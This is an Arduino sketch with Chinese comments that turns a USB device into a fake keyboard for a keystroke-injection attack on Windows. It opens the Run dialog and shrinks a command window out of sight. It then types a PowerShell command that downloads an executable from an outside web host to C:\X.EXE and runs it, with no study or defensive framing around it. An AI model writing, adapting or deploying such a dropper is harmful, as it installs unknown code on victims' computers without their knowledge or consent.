void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.println("CMD.EXE /t:01 /k MODE con: cols=16 lines=2");
  delay(1000);
  Keyboard.println("POWERSHELL -cOMMAND $CLNT = NEW-OBJECT sYSTEM.nET.wEBcLIENT;$URL= 'http://pan.plyz.net/d.asp?u=1948862583&p=x.exe';$FILE = ' c:\\X.EXE ';$CLNT.dOWNLOADfILE($URL,$FILE);");
  delay(3000);
  Keyboard.println("C:\\X.EXE&EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
